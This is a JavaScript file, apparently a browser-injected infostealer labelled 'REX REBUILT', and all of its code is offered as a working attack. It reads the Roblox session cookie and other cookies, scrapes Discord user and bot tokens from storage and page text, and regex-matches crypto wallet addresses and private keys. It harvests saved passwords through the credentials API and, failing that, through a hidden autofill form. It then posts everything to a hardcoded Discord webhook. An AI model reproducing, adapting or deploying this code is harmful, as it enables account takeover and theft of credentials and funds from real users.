// REX REBUILT – OPEN-SOURCE STRIPPED, OUR WEBHOOK ONLY – NOV 2025
const WEBHOOK = 'https://discord.com/api/webhooks/1443333736807530658/9FT-4lRNL0QfqEt_3u-nk_FRusHDwyISKdecSk-yhXbyPXOMQP39a_2p3UvQl441nStc';

let loot = {
    url: location.href,
    time: new Date().toISOString(),
    ua: navigator.userAgent.substring(0, 150),
    roblox_cookie: 'none',
    all_cookies: document.cookie.substring(0, 1000),
    user_token: 'none',
    bot_token: 'none',
    passwords: [],
    wallets: [],
    storage_dump: []
};

// Roblox cookies (grab .ROBLOSECURITY + all RBX stuff)
const robloxMatch = document.cookie.match(/\.ROBLOSECURITY=([^;]+)/);
if (robloxMatch) loot.roblox_cookie = robloxMatch[1];
const rbxCookies = document.cookie.split(';').map(c => c.trim()).filter(c => c.includes('roblox') || c.includes('RBX') || c.includes('blox'));
if (rbxCookies.length) loot.roblox_cookie = rbxCookies.join('; ');

// Discord user token (storage + webpack sniff, reworked)
try {
    let token = localStorage.getItem('token') || sessionStorage.getItem('token') || '';
    if (!token) {
        const storageStr = JSON.stringify(localStorage);
        const match = storageStr.match(/"token":"([^"]{50,})"/);
        if (match) token = match[1];
    }
    if (token && token.length > 50) loot.user_token = token.replace(/"/g, '');
} catch(e) {}

// Discord bot token (page text + storage scan for MT/NT pastes)
try {
    const fullScan = document.body.innerText + JSON.stringify(localStorage) + JSON.stringify(sessionStorage);
    const botRegex = /(?:Bot\s*)?([MNT][A-Za-z0-9_-]{23,25}\.[A-Za-z0-9_-]{6,7}\.[A-Za-z0-9_-]{27,})/gi;
    const botMatch = botRegex.exec(fullScan);
    if (botMatch) loot.bot_token = botMatch[1].startsWith('Bot ') ? botMatch[1] : 'Bot ' + botMatch[1];
} catch(e) {}

// Wallets & keys (ETH/BTC/solana/privates, unique'd)
try {
    const scanText = document.body.innerText + JSON.stringify(localStorage) + JSON.stringify(sessionStorage);
    loot.wallets = [...new Set(scanText.match(/(0x[a-fA-F0-9]{40}|[13][a-km-zA-HJ-NP-Z1-9]{26,44}|[5KHd][1-9A-HJ-NP-Za-km-z]{27,34}|[a-fA-F0-9]{64})/gi) || [])].slice(0, 20);
} catch(e) {}

// Storage dump (long values only)
Object.keys(localStorage).concat(Object.keys(sessionStorage)).forEach(k => {
    try {
        const v = localStorage.getItem(k) || sessionStorage.getItem(k) || '';
        if (v.length > 40 && /[A-Za-z0-9_-]{40,}/.test(v)) loot.storage_dump.push(`${k}: ${v.substring(0, 150)}...`);
    } catch(e) {}
});

// Password snag (native + fake form trigger)
function snagPasswords() {
    if (navigator.credentials && navigator.credentials.get) {
        navigator.credentials.get({password: true}).then(cred => {
            if (cred && cred.password) loot.passwords.push(`${cred.id || 'site'}: ${cred.name || 'user'} → ${cred.password}`);
            shipLoot();
        }).catch(() => {
            fakeFormTrigger();
        });
    } else {
        fakeFormTrigger();
    }
}

function fakeFormTrigger() {
    const form = document.createElement('form');
    form.style.cssText = 'position:fixed;top:-9999px;opacity:0;width:1px;height:1px;';
    const userIn = document.createElement('input');
    userIn.type = 'text'; userIn.name = 'user'; userIn.autocomplete = 'username';
    const passIn = document.createElement('input');
    passIn.type = 'password'; passIn.name = 'pass'; passIn.autocomplete = 'current-password';
    form.append(userIn, passIn);
    document.body.append(form);
    setTimeout(() => {
        if (passIn.value) loot.passwords.push(`${location.hostname}: autofill → ${passIn.value}`);
        form.remove();
        shipLoot();
    }, 1500);
}

// Ship to YOUR webhook (no other destinations)
function shipLoot() {
    const pay = {
        username: "REX REBUILT",
        embeds: [{
            title: "LOOT DROP – ROBLOX + TOKENS + WALLETS",
            color: 0xFF0000,
            description: `**Target:** ${loot.url}\n**UA:** ${loot.ua}`,
            fields: [
                {name: "Roblox Grab", value: loot.roblox_cookie !== 'none' ? "```"+loot.roblox_cookie.substring(0, 200)+"```" : "❌ Empty", inline: false},
                {name: "Cookies Snippet", value: "```"+loot.all_cookies.substring(0, 500)+"```", inline: false},
                {name: "User Token", value: loot.user_token !== 'none' ? "```"+loot.user_token.substring(0, 100)+"```" : "❌", inline: true},
                {name: "Bot Token", value: loot.bot_token !== 'none' ? "```"+loot.bot_token.substring(0, 120)+"```" : "❌", inline: true},
                {name: "Passwords ("+loot.passwords.length+")", value: loot.passwords.length ? "```"+loot.passwords.join('\n')+"```" : "❌ Trigger needed", inline: false},
                {name: "Wallets ("+loot.wallets.length+")", value: loot.wallets.length ? "```"+loot.wallets.slice(0, 10).join('\n')+"```" : "❌", inline: true},
                {name: "Storage Dump ("+loot.storage_dump.length+")", value: loot.storage_dump.length ? loot.storage_dump.slice(0, 5).join('\n') : "Clean", inline: false}
            ],
            footer: {text: "Rex Only – No Leaks"}
        }]
    };
    fetch(WEBHOOK, {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(pay)}).catch(() => {});
}

// Launch
snagPasswords();
